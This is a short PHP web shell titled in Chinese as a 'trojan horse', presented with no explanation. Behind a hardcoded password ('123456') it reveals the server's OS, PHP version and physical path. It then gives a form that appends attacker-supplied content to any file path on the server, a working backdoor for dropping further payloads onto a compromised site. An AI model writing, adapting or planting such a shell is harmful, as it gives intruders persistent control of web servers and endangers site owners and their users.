<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>心东的马儿</title>
</head>

<body>
<?php 
$password = isset($_POST['password']) ? $_POST['password'] : '';
$get = isset($_GET['id']) ? $_GET['id'] : '';
$pass = '123456';
if($password==$pass){
echo '操作系统内核:' .PHP_OS.'<br />';
echo '当前PHP的版本:'.PHP_VERSION.'<br />';
echo '<b style="color:red;">物理路径:'.__DIR__ .'\\</b>';echo'<br /><hr />';
?>
<form action="?id=<?php echo $pass?>" method="post">
你要写入的路径:<input type="text" name="lujin"  style="width:300px;"/><br /><br />
<b>你要写入的内容: </b><br /> <textarea name="neirong" style="width:500px; height:400px;"></textarea><hr/>
<input  type="submit" value="---提交---" style=" margin-left:200px;" /></p>
</form>
<?php exit;}elseif(isset($get) && !empty($get)  && $get==$pass){
        $lujin = @$_POST['lujin'];
        $neirong = @$_POST['neirong'];
         if (empty($lujin) || empty($neirong)) {
        echo '请填写路径或内容';
        exit;        
        }
        $fh = @fopen($lujin,'a');
        @fwrite($fh,$neirong);
        echo '写入成功';
        echo '<hr />';
        echo '您的路径是:'.$lujin;
        exit;
}?>
<form action="" method="post" style=" margin-top:200px; margin-left:40%;"><p>
密码: <input type="password" name="password" /></p>
<p>
<input type="submit" value="提交" style=" margin-left:100px;"/>
</p>
</form>
</body>
</html>
